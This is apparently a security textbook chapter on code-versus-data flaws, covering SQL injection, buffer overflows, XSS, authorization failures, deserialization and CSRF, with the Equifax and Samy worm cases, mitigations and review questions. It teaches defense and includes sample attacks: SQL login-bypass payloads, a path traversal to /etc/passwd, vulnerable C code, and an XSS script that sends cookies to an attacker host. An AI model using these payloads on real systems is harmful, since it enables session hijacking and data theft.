I. Software That Trusts Its Input

Every piece of software is, at its core, a set of instructions that trusts its inputs to behave. Application code vulnerabilitiesApplication Code VulnerabilityA flaw in how a program is written that lets an attacker make it do something the developer never intended, like a typo in a legal contract that a lawyer can exploit to void the whole agreement. The flaw lives in the source code itself, not in a misconfigured server or a weak password. Cataloged systematically under MITRE's Common Weakness Enumeration (CWE) and ranked annually in the OWASP Top 10. See CWE-1000 for the full weakness hierarchy. are the class of security weaknesses that arise directly from how a program processes, validates, and executes the data it receives. Unlike network-layer attacks that exploit misconfigured routers or unpatched operating systems, these vulnerabilities live inside the logic the developer actually wrote, a missing bounds check, an unescaped string, a query built by gluing user input onto a command. The OWASP Top 10OWASP Top 10A regularly updated ranked list of the ten most critical web application security risks, published by the Open Worldwide Application Security Project, a nonprofit that has become the de facto standard reference for developers and security professionals. Think of it as the "most wanted" list for application flaws. Current edition: OWASP Top 10:2021. A08:2021 (Software and Data Integrity Failures), A03:2021 (Injection), and A05:2021 (Security Misconfiguration) are the categories most directly engaged by this chapter. project formalizes this domain, and its categories, Injection, Broken Access Control, Cryptographic Failures, and Security Misconfiguration among them, form the backbone of how the industry classifies and prioritizes these flaws.

The academic root of nearly every vulnerability in this chapter is the same: a program fails to maintain a clean boundary between code (instructions the machine executes) and data (values the program merely processes). When that boundary collapses, because a query is built by string concatenation, because a web page prints untrusted text directly into HTML, because a buffer is copied without checking its length, an attacker who controls the "data" side can smuggle in something that gets treated as "code." This single idea explains SQL injectionSQL Injection (SQLi)An attack where a hacker inserts malicious SQL syntax into an input field so that it gets executed as part of the database's actual query instead of being treated as harmless text. Like slipping a forged instruction into a note that a mail clerk reads aloud and obeys word for word. MITRE CWE-89: Improper Neutralization of Special Elements used in an SQL Command. OWASP A03:2021, Injection. Ranked the most severe injection vector for two decades running., cross-site scriptingCross-Site Scripting (XSS)An attack where malicious JavaScript is injected into a web page viewed by other users, causing their browsers to execute the attacker's script as if it were part of the legitimate site. The victim's own trusted browser session becomes the weapon. MITRE CWE-79. OWASP groups XSS under A03:2021, Injection, since it is fundamentally the same "data becomes code" failure applied to HTML/JS rather than SQL., and buffer overflowBuffer OverflowA bug where a program writes more data into a fixed-size block of memory (a buffer) than it was allocated to hold, causing the excess bytes to spill into adjacent memory, potentially overwriting critical control data like a function's return address. Like pouring water into a cup until it overflows onto the counter, except the "counter" here controls what the CPU executes next. MITRE CWE-121 (Stack-based) and CWE-122 (Heap-based). Formalized by Aleph One's 1996 Phrack article "Smashing the Stack for Fun and Profit," still assigned reading in many university security courses. attacks with a single unifying model, even though the surface mechanics look completely different.

One Failure Wearing Three Costumes If you remember nothing else from this chapter, remember this sentence: every vulnerability here is a failure to separate untrusted data from executable instructions. SQL injection lets data become a database command. XSS lets data become a browser script. Buffer overflow lets data become a CPU instruction pointer. Once you see the pattern, you stop memorizing three unrelated attacks and start recognizing one recurring design flaw wearing three costumes.

Historically, the discipline of secure coding emerged reactively rather than proactively. Early internet-connected applications in the 1990s and 2000s were written by developers optimizing for functionality, not adversarial resilience, the assumption baked into most CGI scripts and early PHP applications was that users would submit well-formed, honest input. The Morris WormMorris Worm (1988)One of the first worms distributed via the internet, written by Robert Tappan Morris. It exploited a buffer overflow in the Unix "finger" daemon (among other vectors) to self-propagate. It infected roughly 10% of all internet-connected computers at the time. Led to the founding of the first CERT (Computer Emergency Response Team) at Carnegie Mellon University in 1988. of 1988 was among the first large-scale demonstrations that a memory-safety bug in production code could cascade into a national-scale incident, but it took another two decades of high-profile breaches before secure software development lifecycles (SSDLC) and mandatory code review became industry norms.

Modern secure coding standards treat input validationInput ValidationThe practice of checking that data received by a program conforms to an expected format, length, type, and range before the program acts on it, rejecting or sanitizing anything that doesn't. Like a bouncer checking IDs at a club door instead of trusting everyone who walks in. OWASP Input Validation Cheat Sheet recommends allow-listing (defining what IS permitted) over deny-listing (trying to enumerate what ISN'T) because deny-lists are trivially bypassed by novel encodings. as the first and most important line of defense, but emphasize that validation alone is insufficient, output must also be handled contextually, memory must be managed safely, and trust boundaries must be explicit at every layer of the application (client, server, database, and any intermediate API). This layered mindset, often called defense in depthDefense in DepthA security strategy that layers multiple independent controls so that if one fails, others still protect the system, like a castle with a moat, a wall, and armed guards, rather than relying on any single barrier. NIST SP 800-53 treats defense in depth as a foundational control-selection principle rather than a single control itself., underlies every mitigation strategy discussed later in this chapter.

Two Catalogues, Two Different Jobs CWE (Common Weakness Enumeration) is a granular taxonomy of individual coding flaws (e.g., CWE-89 is specifically SQL injection). The OWASP Top 10 is a higher-level, ranked risk category list aimed at prioritizing remediation effort (e.g., A03:2021 "Injection" bundles SQLi, XSS, and command injection together). The two answer different questions. A developer fixing a defect needs the CWE, because it names the precise coding mistake and links to the remediation pattern. A security manager allocating a quarter of engineering time needs the OWASP category, because it aggregates thousands of CWEs into a ranking of where breaches actually originate. Reading a finding well means translating between the two: a scanner reporting CWE-79 is telling a manager that the application has an A03 problem.

II. Injection, Overflows, XSS, and Broken Authorization

SQL Injection: Breaking Out of the Query

A web application typically constructs a database query by combining a fixed SQL template with a value supplied by the user, such as a username entered on a login form. When developers build this query through naive string concatenationString ConcatenationJoining two pieces of text together into one string, for example combining a fixed SQL command with a variable holding user input. When done without sanitization, it lets user input change the structure (not just the content) of the resulting string. The root technical cause behind CWE-89. Contrast with parameterized queries, where the database driver keeps code and data in separate channels entirely. rather than a parameterized interface, the boundary between "SQL command" and "user data" disappears entirely, the database server simply sees one continuous string and has no way to know which parts the developer intended as fixed logic.

python (vulnerable) 
# VULNERABLE: user input concatenated directly into SQL string
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)

If an attacker submits the username admin' -- and any password, the resulting query string becomes:

SQL (resulting query) 
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

The double-hyphen -- is a SQL comment delimiterSQL Comment DelimiterA sequence of characters (like -- in most SQL dialects) that tells the database "ignore everything after this point on the line." Attackers use it to truncate the rest of a legitimate query, neutralizing the password check that the developer intended to run. MySQL requires a trailing space after -- to be treated as a comment (-- ). Other dialects like Microsoft T-SQL do not., so everything after it, including the password check, is discarded by the parser. The database authenticates the attacker as admin without ever validating a password. An even more direct classic payload exploits tautologyTautological InjectionA SQL injection payload that inserts a condition which is always logically true (like '1'='1'), forcing a WHERE clause to match every row in a table regardless of the intended filter. Named for the logical concept of a statement true under any interpretation. Commonly appears in login-bypass and data-exfiltration payloads.:

SQL (payload) 
' OR '1'='1
-- Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''

Because '1'='1' evaluates true for every row in the table, the query returns the entire users table, and most poorly written authentication logic simply grants access to whichever record is returned first, frequently the first row inserted, which is very often the administrator account. This exact fault pattern is precisely what the study guide's log artifact captures: Exception: Syntax error in query: SELECT * FROM users WHERE id = 42 OR '1'='1', a syntax error alert is frequently the first observable signal a SOC analyst sees, because attackers rarely craft a perfectly balanced payload on the first attempt, and malformed quote-escaping throws a parser exception that gets logged.

The canonical fix is a parameterized queryParameterized Query (Prepared Statement)A way of sending SQL to a database where the command structure and the user-supplied values are transmitted as two separate channels. The database compiles the fixed query template first, then binds the values afterward purely as data, they can never alter the query's logic, no matter what characters they contain. OWASP's #1 recommended defense against SQLi. Supported natively by virtually every modern database driver (e.g., psycopg2, JDBC PreparedStatement, PDO in PHP)., also called a prepared statement, which sends the SQL structure to the database engine separately from the data values:

python (secure) 
# SECURE: parameterized/prepared query, data is bound, never concatenated
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
# The database driver escapes/binds values out-of-band from the SQL grammar.
# Even a payload like admin'-- is treated as a literal string, not SQL syntax.

Because the query plan is compiled before the user's values are ever substituted in, no combination of quotes, comment markers, or boolean logic in the input can alter what the database executes. This is the mitigation referenced directly in the topic's learning objectives, implementing parameterized prepared queries is the single highest-leverage control against SQL injection.

Buffer Overflow: Overwriting the Stack

Buffer overflows exploit a different trust boundary: the boundary between the size of a memory allocation and the size of the data a program actually writes into it. In languages like C and C++ that do not perform automatic bounds checkingBounds CheckingAutomatically verifying that an array or buffer access stays within its allocated size before performing the read or write. Languages like C leave this entirely to the programmer; languages like Python, Java, and Rust enforce it at runtime or compile time. The absence of automatic bounds checking in C/C++ is the single largest historical source of memory-corruption CVEs., functions such as strcpy() or gets() will happily copy far more data into a fixed-size buffer than it was allocated to hold.

c (vulnerable) 
#include <string.h>

void process_input(char *user_supplied) {
    char buffer[64];               // fixed 64-byte stack buffer
    strcpy(buffer, user_supplied); // NO length check, classic CWE-121
}

int main(int argc, char *argv[]) {
    process_input(argv[1]);        // attacker fully controls argv[1]
    return 0;
}

On the call stackCall StackA region of memory that tracks active function calls in a program, storing local variables and, critically, the return address the CPU should jump back to once the current function finishes. Think of it as a stack of sticky notes, each one recording where to resume when the current task is done. Stack layout is architecture-specific; on x86, the stack grows downward toward lower memory addresses, meaning an overflowing buffer writes "upward" into the saved return address., local variables like buffer are stored adjacent to bookkeeping data the CPU needs, including the saved return addressReturn AddressThe memory address the CPU jumps back to once the currently executing function completes, saved on the stack when the function is called. If an attacker overwrites this value with an address of their choosing, the CPU will "return" into attacker-controlled code instead of the legitimate calling function. Overwriting the return address is the classic technique behind "stack smashing." Modern defenses (stack canaries, ASLR, DEP/NX) were built specifically to make this harder.. If user_supplied is longer than 64 bytes, strcpy() keeps writing past the end of buffer, overwriting adjacent stack memory, including the saved return address. If an attacker crafts input where the overflow precisely overwrites that return address with the memory location of injected shellcode (or an existing library function, as in a return-oriented programmingReturn-Oriented Programming (ROP)An exploitation technique that chains together short existing instruction sequences already present in a program's memory (rather than injecting new code) to perform arbitrary malicious actions, used to bypass defenses like DEP/NX that block execution of injected shellcode. ROP became the dominant exploitation technique after Data Execution Prevention (DEP) became standard, since it never executes attacker-supplied bytes as code, only pre-existing, legitimately executable bytes. chain), the CPU will jump to and execute attacker-chosen instructions the moment the function returns, this is the mechanism behind stack smashingStack SmashingA colloquial term for a buffer overflow attack that specifically overwrites the stack's saved return address to hijack control flow of the program. Popularized by Aleph One's foundational 1996 Phrack article of nearly the same name. Modern compilers insert "stack canaries", a known random value placed before the return address, specifically to detect stack smashing before the corrupted return address is ever used..

Cross-Site Scripting: Executing in the Victim's Browser

XSS exploits the same "data becomes code" failure, but in the context of a web browser rendering HTML rather than a database parsing SQL. If an application echoes user-supplied text back into a page without output encodingOutput Encoding (Escaping)Converting characters with special meaning in a target language (like < and > in HTML) into a literal, harmless representation (like &lt; and &gt;) before inserting untrusted data into that context, so the browser displays it as text rather than interpreting it as markup or script. OWASP's Cross-Site Scripting Prevention Cheat Sheet mandates context-aware encoding, HTML-body encoding differs from HTML-attribute, URL, and JavaScript encoding., any HTML or <script> tags in that input are rendered, and executed, by the victim's browser exactly as if the site's own developers had written them.

html (payload) 
<!-- Comment field submitted by attacker, stored verbatim in the database -->
<script>
  fetch('https://attacker-exfil.net/steal?cookie=' + document.cookie);
</script>
<!-- When ANY other user later views this comment, their browser sends
     their own session cookie to the attacker, full session hijacking -->

Security researchers classify XSS into three subtypes based on where the injected payload persists and executes. Reflected XSSReflected XSSA non-persistent form of cross-site scripting where the malicious payload is embedded in a request (commonly a URL parameter) and immediately echoed back in the server's response, requiring the victim to click a specially crafted, attacker-supplied link. MITRE CWE-79 subtype. Because it requires a victim to click a link, reflected XSS is typically delivered via phishing. occurs when the payload travels in the request itself (often a URL query parameter) and is reflected immediately in the response, requiring the victim to click a crafted link. Stored XSSStored (Persistent) XSSA form of cross-site scripting where the malicious payload is saved permanently on the target server (e.g., in a database-backed comment, profile field, or forum post) and served to every subsequent visitor without requiring any additional action from the attacker. Considered more dangerous than reflected XSS because it self-propagates to every viewer, no phishing link required. See the Samy worm case study below. is more severe: the payload is saved server-side (in a comment, a profile bio, a forum post) and served to every subsequent visitor automatically, with no additional action required from the attacker after the initial post. DOM-based XSSDOM-Based XSSA form of cross-site scripting where the vulnerability exists entirely in client-side JavaScript that unsafely writes untrusted data (often from the URL fragment or query string) into the page's Document Object Model, the payload never even needs to touch the server to execute. MITRE CWE-79 subtype. Common unsafe sinks: innerHTML, document.write(), eval(). Harder to detect with server-side logging since the vulnerable code path never appears in server logs. differs structurally from the other two: the vulnerable code lives entirely client-side, where JavaScript unsafely writes attacker-controlled data (frequently pulled from the URL fragment) directly into the page's Document Object ModelDOM, Document Object ModelThe browser's in-memory tree representation of a web page's structure, which JavaScript can read and modify live. When script writes untrusted data into the DOM using unsafe sinks like innerHTML, that data can be reinterpreted as executable markup. W3C DOM specification. Safe alternatives include textContent (treats input as literal text) instead of innerHTML (parses input as HTML). using an unsafe sink such as innerHTML, meaning the payload never has to pass through the server at all.

Escaping Is Meaningless Until You Name the Context A single generic "escape everything" function is not sufficient defense. The correct encoding depends entirely on where the untrusted data lands: text inside an HTML body needs HTML-entity encoding; text inside an HTML attribute needs attribute encoding; text inside a <script> block needs JavaScript-string encoding; text inside a URL needs percent-encoding. Applying the wrong encoding for the context is one of the most common ways developers introduce XSS even while genuinely believing they've "sanitized" the input.

Insecure Coding Patterns

Beyond injection and memory corruption, several everyday coding habits independently create serious risk. Hardcoded credentialsHardcoded CredentialsUsernames, passwords, API keys, or cryptographic secrets written directly into a program's source code rather than stored in a secured secrets manager or environment variable, meaning anyone who can read the source (including through a public GitHub repository or decompilation) can read the secret. MITRE CWE-798: Use of Hard-coded Credentials. GitGuardian's annual State of Secrets Sprawl report finds millions of hardcoded secrets committed to public repositories every year. embed permanent secrets directly in source code, a practice that turns any code leak, public repository push, or decompiled binary into an instant credential breach. Improper error handlingImproper Error HandlingA coding flaw where a program's error messages leak sensitive internal information (stack traces, database schema, file paths, software versions) to the end user instead of logging that detail privately and showing a generic message. MITRE CWE-209: Generation of Error Message Containing Sensitive Information. Attackers routinely deliberately trigger errors during reconnaissance purely to harvest these details. surfaces raw stack traces, SQL error strings, or file-system paths directly to end users, precisely the kind of verbose syntax-error output that both reveals a working injection point to an attacker and, when logged properly on the defender's side, becomes the detection signal a SOC analyst relies on. Race conditionsRace ConditionA flaw that occurs when a program's correctness depends on the precise timing or ordering of concurrent operations, and an attacker can manipulate that timing to produce an unintended, exploitable outcome. A common security-relevant subtype is TOCTOU. MITRE CWE-362. Classic real-world example: a file permission check followed by a file open, where an attacker swaps the file between the check and the open., particularly the time-of-check to time-of-useTOCTOU, Time-of-Check to Time-of-UseA specific race condition where a program checks a condition (e.g., "does this user have permission to access this file?") and then acts on it, but an attacker changes the underlying state in the gap between the check and the action, invalidating the check's result. MITRE CWE-367. Classic mitigation: perform the check and the action as a single atomic operation, or use locking primitives that make the gap impossible to exploit. (TOCTOU) pattern, arise when a security check and the corresponding privileged action are not performed atomically, giving an attacker a narrow timing window to alter conditions in between.

Escaping Is a Patch; Parameterisation Is a Fix

It is tempting to answer injection by writing a function that finds dangerous characters and neuters them, and a great many breached applications contained exactly such a function. The approach fails for a structural reason rather than an implementation one: escaping requires the application to predict, correctly and permanently, how a second piece of software will parse a string it has never seen. That prediction has to hold across every character set the database accepts, every SQL dialect quirk, and every future version of the driver. A well-documented concrete failure is the multibyte character-set bypass, in which an attacker supplies a byte sequence that a naive escaper treats as two characters and the server, reading it under a different encoding, treats as one character plus an unescaped quotation mark.

A parameterized queryParameterized (Prepared) StatementA database call in which the SQL text and the user-supplied values travel to the server separately. The server parses and plans the statement first, then binds the values into the finished plan, so a value can never add or alter syntax. The defense listed first by the OWASP SQL Injection Prevention Cheat Sheet. removes the prediction entirely. The application sends statement text containing placeholders; the database parses and plans it while the attacker's value is nowhere in sight; the value is then bound into an already-finished plan as a typed argument. There is no parsing step left for a quotation mark to reach. This is why the correct remediation for CWE-89 is not "sanitize better" but "stop building statements by concatenation," and why the same logic reappears across the injection families: the fix is always to hand the interpreter a structure rather than a string it must re-parse.

Authorization Failures: IDOR and BOLA

Injection is a failure of parsing. A second, equally common family is a failure of authorization, and it produces no malformed input at all, every request is perfectly well formed, which is why scanners and web application firewalls routinely miss it. In an insecure direct object referenceIDOR, Insecure Direct Object ReferenceAn application exposes an internal identifier (a row id, filename, or account number) in a request and acts on it without checking that the authenticated caller is entitled to that particular object. MITRE CWE-639. Grouped under OWASP A01:2021, Broken Access Control., the application reads a record identifier out of the request and returns the record without asking whether this caller owns it. Changing /api/invoices/4187 to /api/invoices/4188 retrieves another customer's invoice. The API-specific formulation, broken object level authorizationBOLA, Broken Object Level AuthorizationThe API equivalent of IDOR, and the first entry in the OWASP API Security Top 10. Because REST endpoints are object-addressed by design, every handler must independently re-check ownership of the object it was handed., holds the top position in the OWASP API Security Top 10 for a structural reason: a REST design addresses objects by identifier in nearly every route, so every handler must re-derive the caller's entitlement from the session rather than trusting the identifier it was handed. Replacing sequential identifiers with unguessable ones raises the cost of enumeration but is not a fix; it is obscurity layered over a missing check.

Path Traversal, Deserialization, and Request Forgery

Path traversalPath TraversalUser-controlled text is used to build a filesystem path, and relative segments such as ../ let the resolved path escape the directory the developer intended. MITRE CWE-22. is the filesystem's version of the same boundary failure: a parameter such as ?doc=report.pdf becomes ?doc=../../../../etc/passwd, and the operating system's path resolver, which has no notion of the application's intended directory, obliges. Filtering the literal string ../ is the classic failed defense, defeated by URL encoding, double encoding, and overlong UTF-8 forms. The sound approach is to canonicalize the resolved path and then verify that it still lies beneath the intended base directory, or, better, never to accept a path at all, and instead map an opaque identifier onto a filename through a server-side table.

Insecure deserializationInsecure DeserializationAn application reconstructs objects from attacker-supplied serialized bytes. In languages whose deserializers invoke constructors, setters, or magic methods during reconstruction, the byte stream is effectively a program. MITRE CWE-502. OWASP A08:2021, Software and Data Integrity Failures. is the most severe member of this family, because the vulnerable operation looks like data handling and behaves like code execution. Java's ObjectInputStream, Python's pickle, PHP's unserialize(), and Ruby's Marshal all invoke methods on the classes they reconstruct. An attacker who controls the byte stream chains together methods that already exist in the application's dependencies, a gadget chain, until the chain reaches a call that runs a command. Nothing in the payload is exotic; the exploit is assembled entirely from the victim's own libraries. There is no safe way to deserialize untrusted input in these formats, which is why the remediation is a data-only format such as JSON validated against an explicit schema, plus a signature over any serialized blob that must round-trip through a client.

Cross-site request forgeryCSRF, Cross-Site Request ForgeryA third-party page causes the victim's browser to issue a state-changing request to a site where the victim is already authenticated. The browser attaches the session cookie automatically, so the request is genuine in every respect except intent. MITRE CWE-352. exploits the browser rather than the server's parser. Because cookies are attached to outbound requests according to the destination origin rather than the page that initiated them, a form auto-submitted from an attacker's page arrives at the victim's bank carrying a valid session. The server cannot distinguish it from a legitimate click. The defense is to require a value the attacker's page cannot read: a per-session anti-CSRF token echoed in the request body, together with the SameSite cookie attribute, which instructs the browser not to attach the cookie to cross-site requests at all. The ordering of defenses matters here. Cross-site scripting defeats CSRF tokens outright, because script running inside the victim's own origin can simply read the token out of the page, CSRF protection is only meaningful in an application that has already eliminated XSS.

Recording the Risk, Not Only the Bug

A finding that is never written down in a form a decision-maker can act on is, organizationally, not a finding. Documenting an application or data risk means recording four things: the defect and where it lives; the plausible impact in terms the business recognizes, such as records exposed, service hours lost, or regulatory exposure; the likelihood given the controls actually in place; and a severity that can be compared against unrelated findings. The CVSSCVSS, Common Vulnerability Scoring SystemAn open standard maintained by FIRST that derives a 0.0–10.0 severity score from a vector of exploitability and impact metrics. The Base score describes the flaw's intrinsic properties; Temporal and Environmental metrics adjust it for exploit maturity and for the deploying organization's own context. vector is the usual vehicle for that last part. The Struts defect behind the Equifax breach, CVE-2017-5638, carries an NVD Base score of 9.8 with the vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H: reachable across the network, no privileges required, no user interaction, and total loss of confidentiality, integrity, and availability. Heartbleed, CVE-2014-0160, scores 7.5 with C:H/I:N/A:N, equally trivial to reach, but it only reads memory. Reading the two vectors side by side is what makes the ranking defensible: the gap between the scores is not a matter of reputation but of two named impact metrics.

Documentation is also what carries the risk decision itself. A recorded finding ends in one of four dispositions, remediate, mitigate with a compensating control, transfer (typically to an insurer), or formally accept, and an accepted risk needs a named owner and a review date, because the conditions that made acceptance reasonable expire. On this reading the Equifax timeline is a documentation failure as much as a patching one: the advisory arrived, and nothing in the organization's records tied it to the specific internet-facing host running the vulnerable component.

III. Case Studies: Equifax and the Samy Worm

Case Study 5.1.1: The 2017 Equifax Breach (Apache Struts, CVE-2017-5638)

In March 2017, Equifax, one of the three major U.S. consumer credit bureaus, failed to patch a critical remote code executionRemote Code Execution (RCE)A vulnerability class that lets an attacker execute arbitrary commands on a target system from a remote network location, with no physical or prior authenticated access required, the most severe category of vulnerability, since it grants direct control of the machine. RCE vulnerabilities are typically assigned the highest CVSS severity scores (9.0–10.0). vulnerability, CVE-2017-5638CVE-2017-5638The specific Common Vulnerabilities and Exposures identifier for a critical remote code execution flaw in the Jakarta Multipart parser of Apache Struts 2, caused by improper handling of the Content-Type HTTP header, which allowed an attacker to inject and execute OGNL expressions. CVSS score 10.0 (Critical). Publicly disclosed and patched by Apache on March 7, 2017, Equifax's servers remained unpatched for over two months., in its Apache StrutsApache StrutsA popular open-source framework for building Java web applications, widely used in large enterprise and government systems in the 2010s. Frameworks like Struts handle low-level HTTP parsing so individual developers don't have to write it themselves, meaning a flaw in the framework itself instantly endangers every application built on top of it. Apache Software Foundation project. Struts 2's OGNL (Object-Graph Navigation Language) expression evaluator was the root cause of several severe RCE CVEs across multiple years. web framework, used to power an online dispute-resolution portal. The flaw allowed an attacker to embed a malicious OGNL expression inside the HTTP Content-Type header of a routine file-upload request; because the Struts framework evaluated this header value as executable code rather than treating it strictly as metadata, the attacker's expression executed arbitrary operating-system commands on the server with no authentication whatsoever.

Equifax's internal security team had actually received notice of the vulnerability and an available patch on March 8, 2017, but the patch was never applied to the affected servers due to a breakdown in the company's vulnerability-management process. Attackers exploited the unpatched system starting in mid-May 2017 and maintained undetected access for roughly 76 days, ultimately exfiltrating sensitive personal data, including Social Security numbers, birth dates, and addresses, for approximately 147 million people, one of the largest breaches of personally identifiable information in U.S. history. The incident resulted in a settlement of up to $700 million with the U.S. Federal Trade Commission and state regulators, and it remains the textbook example of how a single unpatched application-layer code vulnerability, left unaddressed for even a few months, can cascade into a catastrophic, nation-scale data breach.

Equifax Was a Patch-Management Failure, Not a Coding Failure Equifax is frequently taught as an injection/RCE case study, but the deeper lesson is organizational: the vulnerable code wasn't a mystery, Apache had already published a fix. The failure was in patch management, the operational discipline of tracking, testing, and deploying vendor security updates promptly. This connects Unit 5's application-layer content directly to Unit 4's vulnerability management concepts: writing secure code matters, but so does actually applying the fixes when flaws are discovered in third-party dependencies you don't control.

Case Study 5.1.2: The 2005 MySpace "Samy" Worm

In October 2005, a MySpace user named Samy Kamkar discovered that the platform's profile "About Me" field allowed limited HTML and CSS but attempted to filter out <script> tags and the literal word "javascript." Kamkar bypassed these filters using creative techniques including splitting the word "javascript" across a CSS expression() property and encoding parts of the payload, ultimately embedding working JavaScript inside his profile page despite the platform's sanitization attempts, a textbook example of an incomplete deny-list failing against a determined attacker.

The injected script was a self-propagating stored XSS wormXSS WormA self-replicating attack that combines stored cross-site scripting with logic that causes the payload to automatically copy itself into every victim's own page, so each new viewer becomes a new spreader, turning a single injection into an exponentially growing infection. The Samy worm is widely cited as the first major XSS worm and remains a standard case study in OWASP training materials.: any time another logged-in user simply viewed Samy's profile, the script silently issued authenticated background requests (using the victim's own active session) that added Samy as a friend and copied the exact same malicious payload into the victim's own profile page. Because every newly infected profile now carried the same self-copying script, the worm spread exponentially, within just under 20 hours, it had added over one million "friend" requests to Samy's profile, at the time the fastest-spreading virus of any kind ever recorded, entirely through a client-side scripting flaw with no traditional malware executable involved. MySpace was forced to take the entire site offline temporarily to contain and remove the payload, and Kamkar was later prosecuted under U.S. computer fraud statutes despite the attack causing no direct financial theft.

Why Samy Replicated and Reflected XSS Cannot Notice what made this attack self-sustaining: the payload didn't just execute once, it replicated itself using the victim's own authenticated session to perform actions on the victim's behalf. This is the essence of stored XSS's danger over reflected XSS: no phishing link, no social engineering step required per victim. Simply viewing a page was the entire infection vector. Modern frameworks (React, Angular, Vue) auto-escape output by default specifically to make this class of bug far harder to introduce accidentally.

IV. Fixing the Code: Parameterization, Encoding, Memory Safety, Secrets

Defending against application code vulnerabilities requires controls at multiple points in the software development lifecycle, not a single silver-bullet fix layered on afterward.

1. Parameterized Queries and the ORM Layer

As established in Section II, parameterized prepared queries are the primary, standards-recommended mitigation against SQL injection, directly satisfying the topic's core learning objective of hardening web databases. Many modern applications additionally use an Object-Relational Mapper (ORM)ORM, Object-Relational MapperA software library that lets developers interact with a database using native programming-language objects and methods instead of writing raw SQL strings by hand, and which, as a side effect, generates parameterized queries automatically under the hood, closing off most string-concatenation injection risk by default. Examples: SQLAlchemy (Python), Hibernate (Java), Entity Framework (.NET). ORMs can still be made vulnerable if a developer explicitly drops down to raw/unescaped query methods., which generates parameterized SQL automatically and removes the temptation to hand-build query strings entirely.

2. Contextual Output Encoding and Content Security Policy

Preventing XSS requires context-aware output encoding at every point untrusted data is rendered, combined with a Content Security Policy (CSP)Content Security Policy (CSP)An HTTP response header that lets a website tell the browser exactly which sources of scripts, styles, and other resources are allowed to execute or load on the page, acting as a browser-enforced allow-list that blocks inline or externally injected scripts even if an XSS flaw exists elsewhere in the code. W3C Content Security Policy Level 3. A strict policy like script-src 'self' blocks inline <script> injection almost entirely, functioning as defense-in-depth against XSS. as a compensating control. Modern frontend frameworks such as React and Angular auto-escape rendered output by default, meaningfully reducing, though not eliminating, the risk of accidental XSS introduced by application developers.

3. Memory-Safe Languages and Compiler Protections

For buffer overflow risk, the most durable long-term mitigation is migrating security-critical code to a memory-safe languageMemory-Safe LanguageA programming language that automatically enforces bounds checking, prevents use-after-free errors, and manages memory allocation/deallocation in a way that makes classic buffer overflow and related memory-corruption bugs structurally impossible (or extremely rare) without requiring the programmer to manually manage raw memory. Examples: Rust, Go, Java, Python, C#. The U.S. CISA and NSA jointly recommended migration toward memory-safe languages in a 2023 guidance document. such as Rust or Go, which structurally prevent this class of bug at compile time or runtime. Where legacy C/C++ code must remain in production, compiler-level protections including stack canariesStack CanaryA known, randomly generated value placed on the stack immediately before the saved return address; if a buffer overflow corrupts the return address, it will almost certainly also corrupt (and thus invalidate) the canary value first, letting the program detect the attack and safely terminate before the corrupted return address is ever used. Also called a "stack cookie." Enabled by default in modern compilers via flags like GCC's -fstack-protector., Address Space Layout Randomization (ASLR)ASLR, Address Space Layout RandomizationAn operating-system defense that randomizes the memory addresses where a program's key regions (stack, heap, libraries) are loaded each time it runs, making it far harder for an attacker to reliably predict the address of injected shellcode or a useful ROP gadget. Standard in modern Windows, Linux, and macOS. Frequently paired with DEP/NX to form a layered memory-corruption defense., and Data Execution Prevention (DEP/NX)DEP / NX, Data Execution PreventionA hardware-and-OS-enforced defense that marks memory regions used for data (like the stack) as non-executable, so even if an attacker successfully injects shellcode into a buffer, the CPU refuses to execute it as instructions. NX ("No-eXecute") is the underlying CPU bit; DEP is Microsoft Windows' implementation name for the same concept. substantially raise the difficulty of successful exploitation.

4. Secrets Management and Secure Error Handling

Hardcoded credentials should be eliminated in favor of dedicated secrets-management systems (such as vault services or environment-injected configuration) that keep sensitive values out of source control entirely. Error handling should follow the principle of "fail generically, log specifically": end users should receive a non-descriptive error message, while full technical detail, including the exact syntax-error trace referenced in this topic's flashcards and SOC monitoring guidance, is written only to secured, internal logging infrastructure where analysts can use it for detection without exposing it to attackers.

A Control That Blocks Is Not a Control That Observes Two kinds of control are easily confused. Mitigation is a control that blocks the exploit outright, such as replacing concatenated SQL with parameterised prepared statements. Detection is a control that observes and reports exploitation attempts, such as a rule that raises an alert when SQL syntax errors appear in an application log. The distinction has operational consequences. A network firewall does not stop application-layer injection travelling inside ordinary HTTPS on port 443, because the packet is well formed at every layer the firewall inspects; the defect and therefore the fix live in the application's own code. Detection controls remain valuable precisely because mitigation is never complete: a burst of SQL syntax errors in an application log is the signature of an attacker probing a query the parameterisation missed.

Self-Check Review Questions

Question 1: Explain, at the mechanical level, how unsafe SQL string concatenation allows an attacker to alter the logical structure of a database query, and describe why parameterized queries neutralize this class of attack.

When an application builds a SQL statement by directly concatenating user-supplied input into a query string, the database engine receives a single undifferentiated string with no way to distinguish which portions were intended by the developer as fixed command logic and which portions originated from the user as data. If the user input contains SQL metacharacters, quotation marks to close a string literal, boolean tautologies like OR '1'='1', or comment delimiters such as -- — those characters are interpreted by the SQL parser as part of the command grammar rather than as inert data, allowing the attacker to alter the query's logical structure (for example, bypassing a WHERE clause password check entirely or causing every row in a table to match). Parameterized (prepared) queries neutralize this by transmitting the query's structural template to the database engine separately from the data values, which are bound in only after the query plan has already been compiled. Because the database never re-parses the bound values as SQL grammar, no sequence of characters supplied by the user, regardless of how many quotes or comment markers it contains, can change the query's logic; it is always treated strictly as a literal data value.

Question 2: Compare reflected, stored, and DOM-based cross-site scripting. Using the 2005 MySpace Samy worm as an example, explain why stored XSS is generally considered more dangerous than reflected XSS.

